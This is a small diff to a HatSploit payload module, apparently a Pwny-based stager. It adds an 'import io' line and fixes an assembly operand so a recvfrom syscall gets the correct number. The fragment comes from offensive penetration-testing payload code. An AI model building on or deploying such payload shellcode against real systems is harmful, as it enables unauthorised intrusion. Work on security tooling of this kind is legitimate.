@@ -4,6 +4,8 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
+import io
+
 from pwny import Pwny
 from pwny.session import PwnySession
 
@@ -54,7 +56,7 @@ class HatSploitPayload(Payload, Handler):
                 mov r10, 0x100
                 xor r8, r8
                 xor r9, r9
-                mov rax, x2d
+                mov rax, 0x2d
                 syscall
 
                 and rsp, -0x10
